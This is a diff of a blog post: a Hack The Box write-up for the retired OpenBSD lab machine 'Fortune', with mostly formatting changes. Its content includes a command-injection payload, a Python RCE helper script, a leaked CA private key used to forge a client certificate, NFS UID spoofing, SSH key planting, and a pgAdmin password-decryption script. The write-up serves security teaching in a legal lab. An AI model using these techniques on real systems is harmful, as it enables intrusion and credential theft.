@@ -2,24 +2,25 @@
 layout: post
 title: Hack The Box - Fortune
 categories: hack-the-box
-tags: [BSD, Web, RCE, Python, Exploit Development, Networking, Pivoting, ssh, php]
+tags: [bsd, web, rce, python, exploit-development, networking, pivoting, ssh, php]
+description: My write-up for Fortune from Hack The Box.
 image: /hackthebox/fortune/0.png
 ---
 
 <hr>
-### Quick Summary 
-#### Hey guys today Fortune retired and here's my write-up about it. It was a very cool box and I really liked it, like the last retired box [LaCasaDePapel](/hack-the-box/lacasadepapel) it had `RCE` and client certificate generation to access a restricted `https` service, but that's only for the initial steps as this box had a lot of interesting stuff. It's an OpenBSD box and its ip is `10.10.10.127`, I added it to `/etc/hosts` as `fortune.htb`. Let's jump right in !
+## Quick Summary 
+<br> Hey guys today Fortune retired and here's my write-up about it. It was a very cool box and I really liked it, like the last retired box [LaCasaDePapel](/hack-the-box/lacasadepapel) it had `RCE` and client certificate generation to access a restricted `https` service, but that's only for the initial steps as this box had a lot of interesting stuff. It's an OpenBSD box and its ip is `10.10.10.127`, I added it to `/etc/hosts` as `fortune.htb`. Let's jump right in !
 ![](/images/hackthebox/fortune/0.png)
 <hr>
-### Nmap
-#### As always we will start with `nmap` to scan for open ports and services :
+## Nmap
+<br> As always we will start with `nmap` to scan for open ports and services :
 `nmap -sV -sT -sC fortune.htb`
 ![](/images/hackthebox/fortune/1.png)
-#### We have `http`, `https` on port 80, port 443 and we have `ssh` on port 22 so we will be focusing on the web services.
+<br> We have `http`, `https` on port 80, port 443 and we have `ssh` on port 22 so we will be focusing on the web services.
 <br>
 <hr>
-### HTTP Initial Enumeration
-#### The index page on `http://fortune.htb` is pretty simple, we have some options where we can choose a database of fortunes and we will get a random fortune from that database :
+## HTTP Initial Enumeration
+<br> The index page on `http://fortune.htb` is pretty simple, we have some options where we can choose a database of fortunes and we will get a random fortune from that database :
 ![](/images/hackthebox/fortune/2.png)
 <br>
 <br>
@@ -27,12 +28,12 @@ image: /hackthebox/fortune/0.png
 <br>
 <br>
 ![](/images/hackthebox/fortune/4.png)
-#### On `https://fortune.htb` we get a handshake error, this probably means that we need a client certificate.
+<br> On `https://fortune.htb` we get a handshake error, this probably means that we need a client certificate.
 ![](/images/hackthebox/fortune/5.png)
 <hr>
-### RCE, Client Certificate Generation
-#### Back to `http://fortune.htb` I intercepted the request with burp and there was only one parameter in the POST request called `db`, after trying some different things I could get `RCE` by appending a semi-colon `;` :
-#### Request :
+## RCE, Client Certificate Generation
+<br> Back to `http://fortune.htb` I intercepted the request with burp and there was only one parameter in the POST request called `db`, after trying some different things I could get `RCE` by appending a semi-colon `;` :
+<br> Request :
 ```
 POST /select HTTP/1.1
 Host: fortune.htb
@@ -48,7 +49,7 @@ Upgrade-Insecure-Requests: 1
 
 db=;pwd
 ```
-#### Response :
+<br> Response :
 ```
 HTTP/1.1 200 OK
 Connection: close
@@ -83,8 +84,8 @@ CHOMPER, CHOMPING.
 </body>
 </html>
 ```
-#### I couldn't get a reverse shell, get `ssh` or read the user flag so we are going to enumerate the box through this `RCE` for some time.
-#### I wrote a script to make it easier : 
+<br> I couldn't get a reverse shell, get `ssh` or read the user flag so we are going to enumerate the box through this `RCE` for some time.
+<br> I wrote a script to make it easier : 
 ```
 #!/usr/bin/python3
 import requests
@@ -113,9 +114,9 @@ while True:
 	print(YELLOW + "[*] Result :")
 	print(result)
 ```
-#### This script takes the command to execute then sends the payload which is `;echo rce_result;COMMAND;echo rce_result_end` then it searches through the response and prints the string between `rce_result` and `rce_result_end` which is the output of our command.
+<br> This script takes the command to execute then sends the payload which is `;echo rce_result;COMMAND;echo rce_result_end` then it searches through the response and prints the string between `rce_result` and `rce_result_end` which is the output of our command.
 ![](/images/hackthebox/fortune/6.png)
-#### There are 3 users on the box : `bob`, `charlie` and `nfsuser` :
+<br> There are 3 users on the box : `bob`, `charlie` and `nfsuser` :
 ```
 [?] command : ls -la /home
 [*] Result :
@@ -127,7 +128,7 @@ drwxr-xr-x   5 bob      bob      512 Nov  3  2018 bob
 drwxr-x---   3 charlie  charlie  512 Aug  2 06:21 charlie
 drwxr-xr-x   2 nfsuser  nfsuser  512 Nov  2  2018 nfsuser
 ```
-#### In `bob`'s home directory there was a directory called `ca` :
+<br> In `bob`'s home directory there was a directory called `ca` :
 ```
 [?] command : ls -la /home/bob
 [*] Result :
@@ -146,7 +147,7 @@ drwx------  2 bob   bob    512 Nov  2  2018 .ssh
 drwxr-xr-x  7 bob   bob    512 Oct 29  2018 ca
 drwxr-xr-x  2 bob   bob    512 Nov  2  2018 dba
 ```
-#### I enumerated that directory for some time and there was a directory called `intermediate` where I found a certificate and a key :
+<br> I enumerated that directory for some time and there was a directory called `intermediate` where I found a certificate and a key :
 ```
 [?] command : ls -la /home/bob/ca
 [*] Result :
@@ -296,7 +297,7 @@ XPwjyvXUcxDf8Jx1MGFfO++6RlZMEO7jmB/xgonPkWP4xEcQlOQ65UfhpLjfum96
 Ma9MyI3TStZzH998nMBc3LsUbXnDr0yofBt1AsLz3JsBHcgRIxYzzvtlIpjk
 -----END RSA PRIVATE KEY-----
 ```
-#### We can use them to generate a `PKCS12` certificate to access the `https` service. with `openssl` we can do it with a single command : 
+<br> We can use them to generate a `PKCS12` certificate to access the `https` service. with `openssl` we can do it with a single command : 
 ```
 openssl pkcs12 -export -in intermediate.cert.pem -inkey intermediate.key.pem -out fortune.p12
 ```
@@ -319,7 +320,7 @@ drwxr-xr-x 3 root root 4096 Aug  2 13:40 ..
 -rw-r--r-- 1 root root 3243 Aug  2 13:40 intermediate.key.pem
 root@kali:~/Desktop/HTB/boxes/fortune/cert# 
 ```
-#### Now we can import the certificate in Firefox :
+<br> Now we can import the certificate in Firefox :
 ![](/images/hackthebox/fortune/7.png)
 <br>
 <br>
@@ -327,44 +328,44 @@ root@kali:~/Desktop/HTB/boxes/fortune/cert#
 <br>
 <br>
 ![](/images/hackthebox/fortune/9.png)
-#### After removing the SSL exception it will ask for our certificate and give us access :
+<br> After removing the SSL exception it will ask for our certificate and give us access :
 ![](/images/hackthebox/fortune/10.png)
 <hr>
-### Elevated Network Access, NFS, User Flag
-#### After getting access to `https` this message is what's on the index page :
+## Elevated Network Access, NFS, User Flag
+<br> After getting access to `https` this message is what's on the index page :
 ![](/images/hackthebox/fortune/11.png)
-#### I didn't know what `authpf` was so I searched about it.
+<br> I didn't know what `authpf` was so I searched about it.
 > authpf is a user shell for authenticating gateways. It is used to change pf rules when a user authenticates and starts a session with sshd and to undo these changes when the user's session exits. It is designed for changing filter and translation rules for an individual source IP address as long as a user maintains an active ssh session. Typical use would be for a gateway that authenticates users before allowing them Internet use, or a gateway that allows different users into different places.  - [freeBSD manual](https://www.freebsd.org/cgi/man.cgi?query=authpf&apropos=0&sektion=8&manpath=FreeBSD+8.1-RELEASE+and+Ports&format=html)
 
 
-#### So basically this can give access to some filtered services we weren't allowed to access before, to use it we need a key and luckily we can generate one :
+<br> So basically this can give access to some filtered services we weren't allowed to access before, to use it we need a key and luckily we can generate one :
 ![](/images/hackthebox/fortune/12.png)
-#### We have 3 users on the box, I tried all of them and `nfsuser` worked :
+<br> We have 3 users on the box, I tried all of them and `nfsuser` worked :
 ![](/images/hackthebox/fortune/13.png)
-#### Now is the time for another `nmap` scan :
+<br> Now is the time for another `nmap` scan :
 `nmap -sV -sT -sC fortune.htb`
 ![](/images/hackthebox/fortune/14.png)
-#### We have two new ports, 8081 which is running `http` and `2049` which is running `nfs`. The `http` service gives us this message :
+<br> We have two new ports, 8081 which is running `http` and `2049` which is running `nfs`. The `http` service gives us this message :
 ![](/images/hackthebox/fortune/15.png)
-#### So probably we need to focus on `nfs`.
+<br> So probably we need to focus on `nfs`.
 > **Network File System** (**NFS**) is a [distributed file system](https://en.wikipedia.org/wiki/Distributed_file_system) protocol originally developed by [Sun Microsystems](https://en.wikipedia.org/wiki/Sun_Microsystems) in 1984, allowing a user on a client [computer](https://en.wikipedia.org/wiki/Computer) to access files over a [computer network](https://en.wikipedia.org/wiki/Computer_network) much like local storage is accessed.  -[Wikipedia](https://en.wikipedia.org/wiki/Network_File_System)
 
 
-#### I used the `RCE` script to check `/etc/exports` and the only thing there was `/home` :
+<br> I used the `RCE` script to check `/etc/exports` and the only thing there was `/home` :
 ```
 [?] command : cat /etc/exports
 [*] Result :
 
 /home
 ```
-#### By using `nfs-ls` (which is a part of the package `libnfs-utils`) we can successfully list the directories :
+<br> By using `nfs-ls` (which is a part of the package `libnfs-utils`) we can successfully list the directories :
 ```
 root@kali:~/Desktop/HTB/boxes/fortune# nfs-ls nfs://fortune.htb/home
 drwxr-xr-x  2  1002  1002          512 nfsuser
 drwxr-xr-x  5  1001  1001          512 bob
 drwxr-x---  3  1000  1000          512 charlie
 ```
-#### I created a directory, called it `mnt` and mounted the `nfs` share in it :
+<br> I created a directory, called it `mnt` and mounted the `nfs` share in it :
 ```
 root@kali:~/Desktop/HTB/boxes/fortune# mkdir mnt && mount -t nfs fortune.htb:/home ./mnt
 root@kali:~/Desktop/HTB/boxes/fortune# ls -la mnt
@@ -376,37 +377,37 @@ drwxr-x--- 3 rick rick  512 Aug  2 12:21 charlie
 drwxr-xr-x 2 1002 1002  512 Nov  3  2018 nfsuser
 root@kali:~/Desktop/HTB/boxes/fortune# 
 ```
-#### However I couldn't access `charlie`'s directory :
+<br> However I couldn't access `charlie`'s directory :
 ```
 root@kali:~/Desktop/HTB/boxes/fortune# cd mnt
 root@kali:~/Desktop/HTB/boxes/fortune/mnt# cd charlie
 -bash: cd: charlie: Permission denied
 ```
-#### This is because I'm trying with `root` whose `uid` is `0` :
+<br> This is because I'm trying with `root` whose `uid` is `0` :
 ```
 root@kali:~/Desktop/HTB/boxes/fortune/mnt# id 
 uid=0(root) gid=0(root) groups=0(root)
 root@kali:~/Desktop/HTB/boxes/fortune/mnt# 
 ```
-#### And the way `nfs` permissions work I need to have the same `uid` as `charlie` which is `1000` :
+<br> And the way `nfs` permissions work I need to have the same `uid` as `charlie` which is `1000` :
 ```
 [?] command : id charlie
 [*] Result :
 
 uid=1000(charlie) gid=1000(charlie) groups=1000(charlie), 0(wheel)
 ```
-#### I already have a user on my box with the `uid` 1000 called `rick` :
+<br> I already have a user on my box with the `uid` 1000 called `rick` :
 ```
 root@kali:~/Desktop/HTB/boxes/fortune/mnt# id rick
 uid=1000(rick) gid=1000(rick) groups=1000(rick)
 root@kali:~/Desktop/HTB/boxes/fortune/mnt#
 ```
 ![](/images/hackthebox/fortune/16.png)
-#### We owned user.
+<br> We owned user.
 <br>
 <hr>
-### Privilege Escalation, Root Flag
-#### First thing I wanted to do is to get `ssh`, luckily I had write access to `authorized_keys` :
+## Privilege Escalation, Root Flag
+<br> First thing I wanted to do is to get `ssh`, luckily I had write access to `authorized_keys` :
 ```
 rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie$ ls -la
 total 22
@@ -429,7 +430,7 @@ drwxr-x--- 3 rick rick 512 Nov  6  2018 ..
 -rw------- 1 rick rick   0 Oct 11  2018 authorized_keys
 rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie/.ssh$ 
 ```
-#### I used `ssh-keygen` to generate a private and a public key :
+<br> I used `ssh-keygen` to generate a private and a public key :
 ```
 root@kali:~/Desktop/HTB/boxes/fortune# mkdir ssh
 root@kali:~/Desktop/HTB/boxes/fortune# ssh-keygen
@@ -457,7 +458,7 @@ root@kali:~/Desktop/HTB/boxes/fortune# cat ssh/id_rsa.pub
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDjxkpA0ZDuhQD+S6db5Vs1jaYcBvQ95b3cIiWihMgHXZC4rMdRVgFhCKaNot9qISpBTnwlP7+NOC0GK7hVw3xDtLuqkTJb8DW2/8dsmsf3TUKX0IkFLz45kZs0eSBfBhl9CYnB5+9A/uQ1UNKufsUQ19sWuzspksvN/PA0aujwEUQgPlMlw+uSlcTxD+zTENVEJoM4cEVE5EvWg/JWYMQLbkob0k5YnDwgr3KdyWOxidsfLNXthd7FYjShVMl2yfW+r1NjJN8mCSE8z8G/GJ9ripwqWzOjgUzDvKIcODnJmt975h6h2oHExipzWj2IUJxPz41HiP3JgeSuDFP87fdz root@kali                               
 root@kali:~/Desktop/HTB/boxes/fortune#
 ```
-#### Then I wrote my public key to `authorized_keys` and got `ssh` as `charlie` :
+<br> Then I wrote my public key to `authorized_keys` and got `ssh` as `charlie` :
 ```
 rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDjxkpA0ZDuhQD+S6db5Vs1jaYcBvQ95b3cIiWihMgHXZC4rMdRVgFhCKaNot9qISpBTnwlP7+NOC0GK7hVw3xDtLuqkTJb8DW2/8dsmsf3TUKX0IkFLz45kZs0eSBfBhl9CYnB5+9A/uQ1UNKufsUQ19sWuzspksvN/PA0aujwEUQgPlMlw+uSlcTxD+zTENVEJoM4cEVE5EvWg/JWYMQLbkob0k5YnDwgr3KdyWOxidsfLNXthd7FYjShVMl2yfW+r1NjJN8mCSE8z8G/GJ9ripwqWzOjgUzDvKIcODnJmt975h6h2oHExipzWj2IUJxPz41HiP3JgeSuDFP87fdz root@kali" >> authorized_keys 
 rick@kali:/root/Desktop/HTB/boxes/fortune/mnt/charlie/.ssh$ cd ../../../ssh/
@@ -469,7 +470,7 @@ OpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018
 Welcome to OpenBSD: The proactively secure Unix-like operating system.
 fortune$ 
 ```
-#### In the home directory of `charlie` there was a file called `mbox` which had an email from `bob` to `charlie` thanking him for setting up `pgadmin4` for him and also telling him that he set the `dba` password to the same as root password :
+<br> In the home directory of `charlie` there was a file called `mbox` which had an email from `bob` to `charlie` thanking him for setting up `pgadmin4` for him and also telling him that he set the `dba` password to the same as root password :
 ```
 fortune$ ls -al
 total 44
@@ -510,8 +511,8 @@ Bob
 
 fortune$ 
 ```
-####  Note : [`pgadmin`](https://www.pgadmin.org/) is an administration and development platform for `PostgreSQL`. 
-#### Earlier when we got the elevated network access there was an `http` port for `pgadmin4` so I checked its web directory in `/var/appsrv` and the database was there :
+<br>  Note : [`pgadmin`](https://www.pgadmin.org/) is an administration and development platform for `PostgreSQL`. 
+<br> Earlier when we got the elevated network access there was an `http` port for `pgadmin4` so I checked its web directory in `/var/appsrv` and the database was there :
 ```
 fortune$ cd /var/appsrv/                                                                                                                                                                                          
 fortune$ ls -la
@@ -532,13 +533,13 @@ drwxr-x---  2 _pgadmin4  wheel     512 Nov  3  2018 sessions
 drwxr-x---  3 _pgadmin4  wheel     512 Nov  3  2018 storage
 fortune$ 
 ```
-#### I downloaded it on my machine :
+<br> I downloaded it on my machine :
 ```
 root@kali:~/Desktop/HTB/boxes/fortune/ssh# scp -i id_rsa charlie@fortune.htb:/var/appsrv/pgadmin4/pgadmin4.db ../
 pgadmin4.db                                                                                                                                                                      100%  116KB   7.7KB/s   00:15    
 root@kali:~/Desktop/HTB/boxes/fortune/ssh# 
 ```
-#### Then I used `strings` to see if I can get anything interesting :
+<br> Then I used `strings` to see if I can get anything interesting :
 ```
 root@kali:~/Desktop/HTB/boxes/fortune# strings pgadmin4.db
 SQLite format 3
@@ -573,13 +574,13 @@ bob@fortune.htb
  Removed Output
 ----------------
 ```
-#### I got some salted hashes, and most importantly this :
+<br> I got some salted hashes, and most importantly this :
 ```
 postgresdba utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz
 ```
-#### This is the db administrator's password hash and we know that it's the same as the root password.
-#### `pgadmin` is an open-source software so I searched on `github` for any cryptography related stuff and found this script called [`crypto.py`](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py).
-#### I took the functions needed to decrypt the hash then I created a script to take the hash/the key and decrypt the hash using the functions from `crypto.py`:
+<br> This is the db administrator's password hash and we know that it's the same as the root password.
+<br> `pgadmin` is an open-source software so I searched on `github` for any cryptography related stuff and found this script called [`crypto.py`](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py).
+<br> I took the functions needed to decrypt the hash then I created a script to take the hash/the key and decrypt the hash using the functions from `crypto.py`:
 ```
 #!/usr/bin/python
 from __future__ import division
@@ -634,7 +635,7 @@ password = decrypt(ciphertext,key)
 
 print "[*] Password : " + password
 ```
-#### The only thing left is to give the right key, I tried the other hashes I got from the database as a key and `bob`'s hash worked : 
+<br> The only thing left is to give the right key, I tried the other hashes I got from the database as a key and `bob`'s hash worked : 
 ```
 $pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg
 ```
@@ -646,12 +647,12 @@ key : $pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGfl
 root@kali:~/Desktop/HTB/boxes/fortune# 
 ```
 ![](/images/hackthebox/fortune/17.png)
-#### And we owned root !
-#### That's it , Feedback is appreciated !
-#### Don't forget to read the [previous write-ups](/categories) , Tweet about the write-up if you liked it , follow on twitter [@Ahm3d_H3sham](https://twitter.com/Ahm3d_H3sham)
-#### Thanks for reading.
+<br> And we owned root !
+<br> That's it , Feedback is appreciated !
+<br> Don't forget to read the [previous write-ups](/categories) , Tweet about the write-up if you liked it , follow on twitter [@Ahm3d_H3sham](https://twitter.com/Ahm3d_H3sham)
+<br> Thanks for reading.
 <br>
 <br>
-#### Previous Hack The Box write-up : [Hack The Box - LaCasaDePapel](/hack-the-box/lacasadepapel/)
-#### Next Hack The Box write-up : [Hack The Box - Arkham](/hack-the-box/arkham/)
+<br> Previous Hack The Box write-up : [Hack The Box - LaCasaDePapel](/hack-the-box/lacasadepapel/)
+<br> Next Hack The Box write-up : [Hack The Box - Arkham](/hack-the-box/arkham/)
 <hr>
